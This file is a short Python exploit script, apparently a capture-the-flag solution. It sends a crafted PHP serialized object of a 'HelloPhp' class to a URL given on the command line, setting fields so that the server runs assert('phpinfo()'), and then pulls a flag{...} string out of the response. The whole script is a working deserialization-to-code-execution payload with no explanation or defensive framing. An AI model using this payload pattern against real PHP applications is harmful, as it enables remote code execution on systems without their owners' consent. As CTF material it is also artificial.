import os
from sys import argv

if __name__ == '__main__':
    try:
        url = argv[1]
    except Exception as e:
        print("python3 exp.py url")
    else:
        from requests import get

        headers = {
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/109.0.0.0 Safari/537.36 '
        }

        payload = '?data=O:8:"HelloPhp":2:{s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";}'
        url = url+payload
        response = get(url=url, headers=headers).text

        from re import findall

        flag = ''.join(findall('flag{.*?}', response))
        print(flag)

